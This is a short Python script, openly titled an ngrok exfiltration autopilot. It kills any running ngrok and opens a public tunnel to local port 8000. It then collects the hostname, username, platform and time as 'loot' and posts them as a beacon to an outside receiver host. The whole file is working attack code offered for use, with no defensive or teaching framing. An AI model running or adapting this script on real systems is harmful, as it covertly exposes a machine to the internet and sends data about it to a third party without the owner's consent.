#!/usr/bin/env python3
import os
import requests
import time
import json

print("[*] NGROK EXFIL AUTOPILOT ENGAGED")

# Step 1: Kill existing ngrok to clean up session
os.system("pkill ngrok")

# Step 2: Launch ngrok tunnel in background (port 8000 default)
os.system("nohup ngrok http 8000 > /dev/null 2>&1 &")
print("[+] Spinning up Ngrok tunnel...")

# Step 3: Wait for tunnel to initialize
time.sleep(4)

# Step 4: Get public Ngrok URL
try:
    r = requests.get("http://127.0.0.1:4040/api/tunnels")
    tunnels = r.json()["tunnels"]
    public_url = tunnels[0]["public_url"]
    print(f"[+] Tunnel established: {public_url}")
except Exception as e:
    print(f"[!] Failed to fetch tunnel URL: {e}")
    public_url = "N/A"

# Step 5: Gather system data
import socket
import platform

loot = {
    "host": socket.gethostname(),
    "user": os.getenv("USER"),
    "platform": platform.platform(),
    "ngrok": public_url,
    "time": time.ctime()
}

# Step 6: Send beacon/exfil
try:
    response = requests.post("https://your-ngrok-receiver.io/post", json=loot)
    print(f"[+] Beacon sent. Status: {response.status_code}")
except Exception as ex:
    print(f"[!] Failed to send beacon: {ex}")
